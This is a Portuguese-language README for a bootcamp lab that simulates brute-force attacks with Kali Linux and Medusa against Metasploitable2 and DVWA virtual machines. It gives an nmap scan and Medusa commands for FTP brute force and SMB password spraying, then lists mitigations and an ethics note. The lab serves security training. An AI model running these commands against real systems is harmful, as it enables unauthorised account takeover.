# Kali + Medusa Brute-Force Lab


**Resumo rápido:** Projeto de laboratório para simular ataques de força bruta (FTP, Web form, SMB) usando Kali Linux e Medusa contra ambientes vulneráveis (Metasploitable2 / DVWA). Propósito educacional em ambiente controlado.


**Alvo (exemplo usado neste repositório):**


## Conteúdo
- `scripts/` — scripts usados (DVWA brute-force, helpers).
- `wordlists/` — wordlists usadas.
- `images/` — screenshots.
- `commands.md` — lista dos comandos utilizados.
- `report/` — relatório final com recomendações.


## Setup do ambiente (resumo)
1. VMs: Kali Linux (atacante) e Metasploitable2/DVWA (alvo) em VirtualBox.
2. Rede: Host-only / Internal Network. Neste repo usamos: `192.168.0.3` como IP alvo.
3. DVWA: configure DB e ajuste security para **low** para testes.


## Passos executados (resumo)
1. Enumeração com Nmap:
```bash
nmap -sS -sV -O -p- 192.168.0.3
```
2. Brute force FTP com Medusa:
```bash
medusa -h 192.168.0.3 -u ftp -P wordlists/small-words.txt -M ftp -n 21 -f
```
3. Brute force de formulário DVWA (script `scripts/dvwa_form_bruteforce.py`)
4. Password spraying SMB:
```bash
medusa -h 192.168.0.3 -U wordlists/users.txt -P wordlists/common-passwords.txt -M smbnt -f
```


## Evidências
- `evidence/ftp_success.txt`
- `evidence/dvwa_success.txt`
- `evidence/smb_success.txt`
- screenshots em `images/`


## Mitigações recomendadas
- MFA, políticas de senha fortes, bloqueios por tentativas, SFTP/SSH, desabilitar SMBv1, WAF, monitoramento de logs.


## Observações éticas e legais
Este projeto foi executado **exclusivamente** em VMs controladas (Kali + Metasploitable/DVWA) com fins educacionais. Não execute estes procedimentos em sistemas sem autorização expressa.


## Autor
Matheus Santos — Bootcamp Santander Cybersegurança 2025 (DIO)